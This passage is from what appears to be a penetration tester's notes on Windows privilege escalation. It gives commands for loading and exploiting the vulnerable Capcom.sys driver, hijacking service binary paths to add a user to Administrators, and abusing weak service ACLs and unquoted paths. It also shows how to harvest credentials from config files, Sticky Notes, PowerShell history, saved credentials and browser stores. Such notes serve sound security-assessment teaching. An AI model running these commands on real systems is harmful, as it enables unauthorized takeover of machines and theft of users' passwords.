</pre><td class="rouge-code"><pre><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">HKCU\System\CurrentControlSet\CAPCOM</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">ImagePath</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="s2">"\??\C:\Users\Public\Downloads\Capcom.sys"</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">HKCU\System\CurrentControlSet\CAPCOM</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">Type</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_DWORD</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">1</span><span class="w">
</span></pre></table></code></div></div><p>We can use the <a href="https://www.nirsoft.net/utils/driverview.html">DriverView.exe</a> tool to see if the <code class="language-plaintext highlighter-rouge">Capcom.sys</code> driver is loaded or not.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\DriverView.exe</span><span class="w"> </span><span class="nx">/stext</span><span class="w"> </span><span class="nx">drivers.txt</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">drivers.txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-pattern</span><span class="w"> </span><span class="nx">Capcom</span><span class="w">
</span></pre></table></code></div></div><p>If the second command doesn’t give you any output, it means that the driver is not loaded. You can run the program that you have compiled earlier :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">EnableSeLoadDriverPrivilege.exe</span><span class="w">
</span></pre></table></code></div></div><p>If you run the previous commands, you will now see that the <code class="language-plaintext highlighter-rouge">Capcom.sys</code> driver is now loaded. You can now use <a href="https://github.com/tandasat/ExploitCapcom">this PoC</a> to exploit the <code class="language-plaintext highlighter-rouge">Capcom.sys</code>.</p><blockquote class="prompt-danger"><div><p>If you don’t have a GUI connection to the windows machine, you may not be able to execute the previous exploit. You can modify it by replacing the call of the <code class="language-plaintext highlighter-rouge">cmd.exe</code> in the <code class="language-plaintext highlighter-rouge">LaunchShell</code> by a call to a reverse shell executable that you created before compiling <code class="language-plaintext highlighter-rouge">ExploitCapcom.cpp</code>. The line should look like <code class="language-plaintext highlighter-rouge">TCHAR CommandLine[] = TEXT("C:\\ProgramData\\MyReverseShell.exe");</code>.</p></div></blockquote><p>You can automate all this process with <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">this exploit</a> and then run the <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code> to pop us a <code class="language-plaintext highlighter-rouge">SYSTEM</code> shell :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">EoPLoadDriver.exe</span><span class="w"> </span><span class="nx">System\CurrentControlSet\Capcom</span><span class="w"> </span><span class="nx">C:\Users\Public\Downloads\Capcom.sys</span><span class="w">
</span></pre></table></code></div></div><h3 id="server-operators"><span class="mr-2">Server Operators</span><a href="#server-operators" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Members in the <code class="language-plaintext highlighter-rouge">Server Operators</code> group can administer domain controllers. This group exists only on domain controllers. By default, the group has no members. Members of the <code class="language-plaintext highlighter-rouge">Server Operators</code> group can perform the following: sign in to a server interactively, create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer, and shut down the computer. This group cannot be renamed, deleted, or moved. Membership of this group confers the powerful <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> and <code class="language-plaintext highlighter-rouge">SeRestorePrivilege</code> privileges and the ability to control local services.</p><p>We need to find a service that start as <code class="language-plaintext highlighter-rouge">SYSTEM</code>. We can do it by using the <code class="language-plaintext highlighter-rouge">sc qc SERVICE_NAME</code> command or the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a> as follows :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PsService.exe</span><span class="w"> </span><span class="nx">security</span><span class="w"> </span><span class="nx">SERVICE_NAME</span><span class="w">
</span></pre></table></code></div></div><p>If the <code class="language-plaintext highlighter-rouge">Server Operators</code> group has privileges over this service we should see something like :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">[ALLOW] BUILTIN\Server Operators
                All
</span></pre></table></code></div></div><p>Now that we know which service to exploit, we can change its binary path to execute a command like a reverse shell or adding our user to a certain group :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">sc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">SERVICE_NAME</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"cmd /c net localgroup Administrators OUR_USER /add"</span><span class="w">
</span></pre></table></code></div></div><p>We will get an error when starting the service because of the previous command. But when the error is prompted check your listener or in which group you are in. You should see that the previous command worked :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">SERVICE_NAME</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>If the service is already running, you can stop it with the <code class="language-plaintext highlighter-rouge">sc stop SERVICE_NAME</code> command.</p></div></blockquote><blockquote class="prompt-tip"><div><p>Now that we have complete access to the domain controller, we can use crackmapexec to dump admin credentials, for example.</p></div></blockquote><hr /><h2 id="os-attacks"><span class="mr-2">OS Attacks</span><a href="#os-attacks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="checking-weak-acl"><span class="mr-2">Checking Weak ACL</span><a href="#checking-weak-acl" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can check if there are binaries with weak ACL permission with the <a href="https://github.com/GhostPack/SharpUp/">SharpUp</a> executable :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpUp.exe</span><span class="w"> </span><span class="nx">audit</span><span class="w">
</span></pre></table></code></div></div><p>With the result gathered with the <code class="language-plaintext highlighter-rouge">SharpUp</code> command, we can sharpen our results with the <code class="language-plaintext highlighter-rouge">icalcs</code> command :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="s2">"C:\PATH\TO\THE\FILE.exe"</span><span class="w">
</span></pre></table></code></div></div><p>When you find a vulnerable service you can replace the executable by your own (shell, reverse shell, add your user to admin group…) and then launch the service :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">SERVICE_NAME</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Don’t forget to make a copy of the executable you are replacing not to break the environment and get back to the initial state after your assessment.</p></div></blockquote><p>You can also use the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a> command to check for file permissions of the service :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">accesschk.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w"> </span><span class="nx">SERVICE_NAME</span><span class="w">
</span></pre></table></code></div></div><p>If you have enough rights, you can change the path of the binary as in the <a href="/Notes/Privilege_Escalation/Windows_PE#server-operators">Server Operators</a> section.</p><h3 id="unquoted-service-path"><span class="mr-2">Unquoted Service Path</span><a href="#unquoted-service-path" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The registry configuration establishes a path to the binary that must be run when a service is started after it is installed. Windows will make an attempt to locate this binary in several locations if it is not enclosed in quotes.</p><p>You can search for unquote service path manualy withe the <code class="language-plaintext highlighter-rouge">sc qc SERVICE_NAME</code> or automatically with the command :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="s2">"auto"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"c:\windows\\"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"""
</span></pre></table></code></div></div><p>If we find a service which has the path <code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\My Service\MyService.exe</code>, then, Windows will try to locate <code class="language-plaintext highlighter-rouge">C:\Program.exe</code> or <code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\My.exe</code> because the path isn’t between quotes. So if we have enough rights to put a malicious executable in those places, we could hijack the service.</p><h3 id="kernel-exploit"><span class="mr-2">Kernel Exploit</span><a href="#kernel-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Most of the Windows kernel exploit have their own CVE and PoC so I’m not going to go in depth with them but here is a list of some of them :</p><ul><li><a href="https://www.exploit-db.com/exploits/39574">MS16-032</a><li><a href="https://www.exploit-db.com/exploits/40823">MS16-135</a><li><a href="https://www.exploit-db.com/exploits/41891">MS17-010</a><li><a href="https://github.com/eonrickity/CVE-2017-0213">CVE-2017-0213</a><li><a href="https://pentestlab.blog/2017/04/13/hot-potato/">Hot Potato</a><li><a href="https://github.com/Cn33liz/SmashedPotato">SmashedPotato</a></ul><hr /><h2 id="credential-theft"><span class="mr-2">Credential Theft</span><a href="#credential-theft" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Once we arrive on a machine, we may want to look for credentials. Either they are still in some history or in some files. Some people put their password in some file in clear-text and we can find those by searching the keyword <code class="language-plaintext highlighter-rouge">password</code> :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/SIM</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">cfg</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>The <code class="language-plaintext highlighter-rouge">/M</code> option in <code class="language-plaintext highlighter-rouge">/SIM</code> can be removed to print the content of the file. The above command will only display file names.</p></div></blockquote><blockquote class="prompt-tip"><div><p>The <code class="language-plaintext highlighter-rouge">/i</code> or <code class="language-plaintext highlighter-rouge">/p</code> flags can be added to respectively ignores the case of the characters when searching for the string and skip files with non-printable characters. For more information about <code class="language-plaintext highlighter-rouge">findstr</code> flags, you can check its <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr">manual</a></p></div></blockquote><h3 id="file-extensions"><span class="mr-2">File Extensions</span><a href="#file-extensions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>You can look for interesting file based on their name and/or their extension. Here are some example on how to do so :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dir</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="o">*</span><span class="nx">pass</span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">pass</span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">pass</span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">cred</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="o">*</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">where</span><span class="w"> </span><span class="nx">/R</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ChildItem</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">rdp</span><span class="p">,</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="p">,</span><span class="w"> </span><span class="o">*.</span><span class="nf">vnc</span><span class="p">,</span><span class="w"> </span><span class="o">*.</span><span class="nf">cred</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Ignore</span><span class="w">
</span></pre></table></code></div></div><h3 id="sticky-notes-passwords"><span class="mr-2">Sticky Notes Passwords</span><a href="#sticky-notes-passwords" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Sticky Notes is a basic Windows app that allows you to take notes and save them on your computer. Those notes are saved as information in a database and are located in :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">C:\Users\USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
</span></pre></table></code></div></div><p>We can copy all <code class="language-plaintext highlighter-rouge">plum.sqlite*</code> files down to our system and open them with a tool such as <a href="https://sqlitebrowser.org/dl/">DB Browser for SQLite</a> and view the Text column in the Note table with the query :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="nb">Text</span> <span class="k">FROM</span> <span class="n">Note</span><span class="p">;</span>
</pre></table></code></div></div><p>This can also be done with PowerShell using the <a href="https://github.com/RamblingCookieMonster/PSSQLite">PSSQLite</a> module :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">Process</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span><span class="p">[</span><span class="n">Y</span><span class="p">]</span><span class="w"> </span><span class="n">Yes</span><span class="w">  </span><span class="p">[</span><span class="n">A</span><span class="p">]</span><span class="w"> </span><span class="n">Yes</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">All</span><span class="w">  </span><span class="p">[</span><span class="n">N</span><span class="p">]</span><span class="w"> </span><span class="n">No</span><span class="w">  </span><span class="p">[</span><span class="n">L</span><span class="p">]</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">All</span><span class="w">  </span><span class="p">[</span><span class="n">S</span><span class="p">]</span><span class="w"> </span><span class="n">Suspend</span><span class="w">  </span><span class="p">[</span><span class="nf">?</span><span class="p">]</span><span class="w"> </span><span class="n">Help</span><span class="w"> </span><span class="p">(</span><span class="n">default</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="s2">"N"</span><span class="p">):</span><span class="w"> </span><span class="n">A</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="o">.</span><span class="nx">\PSSQLite\</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PSSQLite.psd1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'C:\Users\Bob\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-SqliteQuery</span><span class="w"> </span><span class="nt">-Database</span><span class="w"> </span><span class="nv">$db</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"SELECT Text FROM Note"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nt">-wrap</span><span class="w">
</span></pre></table></code></div></div><h3 id="chrome-dictionary-files"><span class="mr-2">Chrome Dictionary Files</span><a href="#chrome-dictionary-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We also can find clear-text passwords in Google dictionary files. Sensitive information, such as passwords, may be submitted via a browser-based application or email client, which highlights any terms it doesn’t understand. In order to eliminate the annoying red underlining, the user may add these words to their dictionary.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">gc</span><span class="w"> </span><span class="s1">'C:\Users\Bob\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nx">password</span><span class="w">
</span></pre></table></code></div></div><h3 id="unattended-installation-files"><span class="mr-2">Unattended Installation Files</span><a href="#unattended-installation-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Auto-logon settings or additional accounts that will be established as part of the installation may be defined via unattended installation files. The <code class="language-plaintext highlighter-rouge">unattend.xml</code> file stores passwords either in plaintext or base64-encoded form.</p><h3 id="powershell-history-file"><span class="mr-2">PowerShell History File</span><a href="#powershell-history-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In Powershell 5.0 and higer, its history is stored in this file :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
</span></pre></table></code></div></div><p>We can confirm that this is the real path using Powershell :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-PSReadLineOption</span><span class="p">)</span><span class="o">.</span><span class="nf">HistorySavePath</span><span class="w">
</span></pre></table></code></div></div><p>To read the content of this history file, we can use <code class="language-plaintext highlighter-rouge">type FILE_TO_READ</code> or the <code class="language-plaintext highlighter-rouge">gc</code> command :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">gc</span><span class="w"> </span><span class="p">(</span><span class="n">Get-PSReadLineOption</span><span class="p">)</span><span class="o">.</span><span class="nf">HistorySavePath</span><span class="w">
</span></pre></table></code></div></div><p>To list history of all users that we have access as our current one, we can use this one-liner :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">foreach</span><span class="p">(</span><span class="nv">$user</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">((</span><span class="n">ls</span><span class="w"> </span><span class="nx">C:\users</span><span class="p">)</span><span class="o">.</span><span class="nf">fullname</span><span class="p">)){</span><span class="n">cat</span><span class="w"> </span><span class="s2">"</span><span class="nv">$user</span><span class="s2">\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h3 id="saved-credentilas"><span class="mr-2">Saved Credentilas</span><a href="#saved-credentilas" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can list users that have saved their credentials using the command <code class="language-plaintext highlighter-rouge">cmdkey /list</code>. Now that we know which user have saved their credentials, we can run command as them :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">runas</span><span class="w"> </span><span class="nx">/savecred</span><span class="w"> </span><span class="nx">/user:DOMAIN\USER</span><span class="w"> </span><span class="s2">"COMMAND HERE"</span><span class="w">
</span></pre></table></code></div></div><h3 id="browser-credentials"><span class="mr-2">Browser Credentials</span><a href="#browser-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To retreive browser saved credentials, we can use tools such as <a href="https://github.com/GhostPack/SharpDPAPI">SharpChrome</a> :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpChrome.exe</span><span class="w"> </span><span class="nx">logins</span><span class="w"> </span><span class="nx">/unprotect</span><span class="w">
